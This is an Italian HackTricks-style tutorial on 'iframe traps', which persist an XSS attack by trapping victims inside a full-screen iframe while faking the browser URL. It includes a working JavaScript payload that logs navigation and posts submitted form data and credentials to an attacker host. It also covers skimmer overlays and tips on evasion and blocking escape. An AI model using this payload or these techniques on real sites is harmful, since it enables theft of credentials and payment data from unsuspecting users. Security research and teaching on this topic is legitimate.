# Trappole iframe

{{#include ../banners/hacktricks-training.md}}

## Informazioni di base

Questa forma di abuso di XSS tramite iframe per rubare informazioni mentre l'utente si sposta nella pagina web è stata pubblicata originariamente in questi 2 post di trustedsec.com: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **e** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

L'attacco inizia su una pagina vulnerabile a XSS in cui è possibile fare in modo che le **vittime non lascino l'XSS** facendole **navigare all'interno di un iframe** che occupa tutta l'applicazione web.

L'attacco XSS caricherà fondamentalmente la pagina web in un iframe che occupa il 100% dello schermo. Di conseguenza, la vittima **non noterà di essere dentro un iframe**. Poi, se la vittima naviga nella pagina cliccando link all'interno dell'iframe (all'interno del web), starà **navigando dentro l'iframe** con l'SS arbitrario caricato che ruba informazioni da questa navigazione.

Inoltre, per renderlo più realistico, è possibile usare alcuni **listeners** per verificare quando un iframe cambia la location della pagina e aggiornare l'URL del browser con quelle location in modo che l'utente pensi di spostarsi tra le pagine usando il browser.

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

Inoltre, è possibile usare listeners per rubare informazioni sensibili, non solo le altre pagine che la vittima visita, ma anche i dati usati per **compilare i form** e inviarli (credenziali?) o per **rubare il local storage**...

Ovviamente, le principali limitazioni sono che **la vittima che chiude la scheda o inserisce un altro URL nel browser uscirà dall'iframe**. Un altro modo per uscire sarebbe ricaricare la pagina (**refresh the page**), tuttavia ciò potrebbe essere parzialmente **impedito** disabilitando il menu contestuale del click destro ogni volta che viene caricata una nuova pagina all'interno dell'iframe o rilevando quando il mouse dell'utente lascia l'iframe — potenzialmente per cliccare il pulsante di reload del browser — e in questo caso l'URL del browser viene aggiornato con l'URL originale vulnerabile a XSS, quindi se l'utente la ricarica, verrà nuovamente avvelenata (nota: questo non è molto stealth).

## Trappola modernizzata (2024+)

* Usare un **full‑viewport iframe** più History/Navigation API per simulare una navigazione reale.

<details>
<summary>Trappola full-viewport iframe</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) mantiene la barra degli URL esterna sincronizzata senza leaking dell'URL reale.
* Vai in **fullscreen** per nascondere l'UI del browser e disegnare la tua barra indirizzi/lucchetto falso.

## Uso di overlay & skimmer

* Merchant compromessi sostituiscono gli hosted payment iframes (Stripe, Adyen, etc.) con un **overlay pixel‑perfect** che inoltra i tasti mentre il frame reale resta sotto, a volte usando legacy validation API in modo che il flusso non si interrompa.
* Intrappolare gli utenti nel top frame cattura i dati di **autofill/password‑manager** prima che notino che la barra URL non è mai cambiata.

## Trucchi di evasione osservati nella ricerca del 2025

* `about:blank`/`data:` local frames ereditano l'origine del parent e bypassano alcune euristiche dei content‑blocker; iframe annidati possono riapparire anche quando le extension smontano i frame di terze parti.
* **Permission propagation**: riscrivere l'attributo parent `allow` concede ai frame attaccanti annidati fullscreen/camera/microphone senza evidenti cambi DOM.

## Brevi consigli OPSEC

* Rifocalizza l'iframe quando il mouse esce (`mouseleave` su body) per impedire agli utenti di raggiungere l'UI del browser.
* Disabilita il context menu e le scorciatoie comuni (`keydown` per `F11`, `Ctrl+L`, `Ctrl+T`) dentro il frame per rallentare i tentativi di fuga.
* Se CSP blocca gli script inline, inietta un remote bootstrapper e abilita `srcdoc` sull'iframe in modo che il tuo payload viva fuori dalla CSP imposta dalla pagina principale.

## Related

{{#ref}}
clickjacking.md
{{#endref}}



## Riferimenti

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
